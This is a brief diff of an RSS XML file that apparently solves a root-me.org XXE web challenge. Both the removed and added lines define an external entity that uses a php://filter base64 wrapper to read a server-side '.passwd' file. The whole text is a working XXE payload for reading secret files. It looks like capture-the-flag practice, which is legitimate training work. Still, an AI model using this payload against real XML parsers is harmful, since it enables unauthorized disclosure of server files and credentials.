@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE rss[
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/.passwd" >
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=.passwd" >
 ]>
 <rss version="2.0">
 <channel>
